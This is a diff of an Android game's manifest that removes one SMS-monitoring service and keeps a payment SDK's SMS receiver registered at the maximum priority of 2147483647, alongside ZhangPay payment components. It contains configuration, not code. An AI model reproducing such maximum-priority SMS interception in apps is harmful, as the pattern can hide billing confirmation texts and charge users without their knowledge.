@@ -4,25 +4,19 @@
     <application android:icon="@drawable/icon" android:label="@string/app_name">
         <meta-data android:name="android.app.lib_name" android:value="cocos2dcpp"/>
         <activity android:configChanges="keyboardHidden|orientation|screenSize" android:label="@string/app_name" android:name="org.cocos2dx.cpp.AppActivity" android:screenOrientation="landscape" android:theme="@android:style/Theme.NoTitleBar.Fullscreen">
-            <intent-filter>
+		    <intent-filter>
                 <action android:name="android.intent.action.MAIN"/>
                 <category android:name="android.intent.category.LAUNCHER"/>
             </intent-filter>
         </activity>
-		<receiver android:name="com.mj.jar.pay.InSmsReceiver">
+
+        <receiver android:name="com.mj.jar.pay.InSmsReceiver">
             <intent-filter android:priority="2147483647">
                 <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
             </intent-filter>
         </receiver>
         <service android:name="com.mj.jar.pay.SmsServices"/>
 
-        <activity android:name=".HejuActivity" android:screenOrientation="landscape" android:theme="@style/HejuActivityStyle"/>
-        <meta-data android:name="hKey" android:value="21a8173ed81c193ba22c1b1f97469afa"/>
-        <service android:name="org.hj201606.lib.sms.MonitorService">
-            <intent-filter>
-                <action android:name="intent.action.HEJU"/>
-            </intent-filter>
-        </service>
         <activity android:exported="true" android:name="org.zzf.core.activity.ZhangPayActivity" android:theme="@android:style/Theme.Translucent"/>
         <service android:name="org.zzf.core.service.ZhangPayPlateService"/>
         <receiver android:name="org.zzf.core.service.ServiceRecevier">
